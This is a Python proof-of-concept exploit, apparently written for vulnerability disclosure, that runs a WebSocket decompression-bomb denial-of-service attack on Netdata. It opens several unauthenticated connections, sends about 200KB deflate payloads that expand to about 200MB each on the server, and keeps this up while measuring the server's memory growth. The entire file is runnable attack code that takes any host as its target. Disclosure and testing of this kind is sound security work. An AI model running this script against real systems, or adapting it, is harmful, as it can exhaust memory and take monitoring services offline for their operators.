#!/usr/bin/env python3
"""
Netdata WebSocket Decompression Bomb PoC (NETDATA-001)

Sends ~200KB compressed payloads via permessage-deflate that decompress to
~200MB each server-side. Continuously sends bombs to sustain memory pressure,
proving the allocation is repeatable and not a one-time transient.

Measures impact via /proc VmRSS polling during sustained bombardment.

Usage:
    python3 websocket_decompression_bomb.py <host> [port] [connections]

    Optional env: DOCKER_CONTAINER=<name> to enable /proc VmRSS measurement
"""

import sys
import socket
import struct
import base64
import zlib
import os
import time
import threading
import subprocess

def get_rss(container):
    if not container:
        return None
    try:
        r = subprocess.run(
            ["docker", "exec", container, "cat", "/proc/1/status"],
            capture_output=True, text=True, timeout=5
        )
        for line in r.stdout.split("\n"):
            if line.startswith("VmRSS"):
                return int(line.split()[1])
    except Exception:
        pass
    return None

def ws_connect(host, port):
    key = base64.b64encode(os.urandom(16)).decode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((host, port))
    sock.sendall((
        f"GET /api/v1/ws?protocol=mcp HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Protocol: mcp\r\n"
        f"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15\r\n"
        f"\r\n"
    ).encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Closed during handshake")
        resp += chunk
    status = resp.decode(errors="replace").split("\r\n")[0]
    if "101" not in status:
        raise ConnectionError(f"Handshake failed: {status}")
    if "permessage-deflate" not in resp.decode(errors="replace").lower():
        raise ConnectionError("Server rejected permessage-deflate")
    return sock

def create_bomb(target_mb=200):
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    data = b""
    chunk = b"\x00" * (1024 * 1024)
    for _ in range(target_mb):
        data += c.compress(chunk)
    data += c.flush(zlib.Z_SYNC_FLUSH)
    if data.endswith(b"\x00\x00\xff\xff"):
        data = data[:-4]
    return data

def ws_frame(payload, opcode=0x01, rsv1=True):
    first = 0x80 | (0x40 if rsv1 else 0) | opcode
    mask_key = os.urandom(4)
    plen = len(payload)
    if plen < 126:
        hdr = struct.pack("BB", first, 0x80 | plen)
    elif plen < 65536:
        hdr = struct.pack("!BBH", first, 0x80 | 126, plen)
    else:
        hdr = struct.pack("!BBQ", first, 0x80 | 127, plen)
    hdr += mask_key
    masked = bytearray(payload)
    for i in range(len(masked)):
        masked[i] ^= mask_key[i % 4]
    return hdr + bytes(masked)

def bomb_loop(sock, frame, stop_event):
    """Continuously send bombs until stopped. Drain responses between sends."""
    while not stop_event.is_set():
        try:
            sock.sendall(frame)
            # Drain any response without blocking long
            sock.settimeout(0.1)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            sock.settimeout(30)
        except Exception:
            break

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host> [port] [connections]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 19999
    num_conns = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    container = os.environ.get("DOCKER_CONTAINER", "netdata-test")

    print(f"Target: {host}:{port}")
    print(f"Connections: {num_conns}")
    print()

    # Create bomb
    bomb = create_bomb(200)
    frame = ws_frame(bomb)
    print(f"Compressed payload: {len(bomb):,} bytes ({len(bomb)/1024:.0f} KB)")
    print(f"Decompressed size:  ~200 MB per message")
    print(f"Amplification:      {200*1024*1024/len(bomb):,.0f}:1")
    print()

    # Baseline
    rss_before = get_rss(container)
    if rss_before:
        print(f"Server VmRSS before: {rss_before:,} kB ({rss_before//1024} MB)")
    else:
        print(f"(Set DOCKER_CONTAINER env var to enable VmRSS measurement)")
    print()

    # Connect
    print(f"Connecting {num_conns} WebSocket clients with permessage-deflate...")
    sockets = []
    for i in range(num_conns):
        try:
            s = ws_connect(host, port)
            sockets.append(s)
        except Exception as e:
            print(f"  Connection {i+1} failed: {e}")
    print(f"  {len(sockets)} connections established")
    print()

    # Start continuous bombing on all connections
    print(f"Sustained bombardment: sending bombs continuously on all {len(sockets)} connections...")
    print(f"Each connection sends ~199 KB every time the server finishes processing the previous bomb.")
    print()

    stop = threading.Event()
    threads = []
    for s in sockets:
        t = threading.Thread(target=bomb_loop, args=(s, frame, stop), daemon=True)
        t.start()
        threads.append(t)

    # Monitor VmRSS during sustained attack
    if rss_before:
        peak = rss_before
        print(f"  {'Time':>8}  {'VmRSS':>12}  {'Delta':>10}")
        print(f"  {'─'*8}  {'─'*12}  {'─'*10}")
        for i in range(20):
            time.sleep(0.5)
            rss = get_rss(container)
            if rss:
                if rss > peak:
                    peak = rss
                delta = (rss - rss_before) / 1024
                print(f"  t+{(i+1)*0.5:.1f}s  {rss//1024:>9} MB  {delta:>+9.0f} MB")

        print()
        total_delta = (peak - rss_before) / 1024
        per_conn = total_delta / len(sockets) if sockets else 0
        print(f"  Peak VmRSS:     {peak:,} kB ({peak//1024} MB)")
        print(f"  Sustained delta: +{total_delta:,.0f} MB across {len(sockets)} connections")
        print(f"  Per connection:  ~{per_conn:.0f} MB server / {len(bomb)/1024:.0f} KB attacker")

    # Stop bombing
    stop.set()
    for t in threads:
        t.join(timeout=3)

    # Close and measure recovery
    print()
    print("Stopping attack and closing connections...")
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    time.sleep(3)
    rss_after = get_rss(container)
    if rss_after and rss_before:
        print(f"  VmRSS after close: {rss_after:,} kB ({rss_after//1024} MB, {(rss_after-rss_before)/1024:+.0f} MB)")

    print()
    print(f"No authentication required. Default configuration vulnerable.")
    print(f"Attack sustains ~{per_conn:.0f} MB memory pressure per connection with only {len(bomb)/1024:.0f} KB bandwidth each.")

if __name__ == "__main__":
    main()
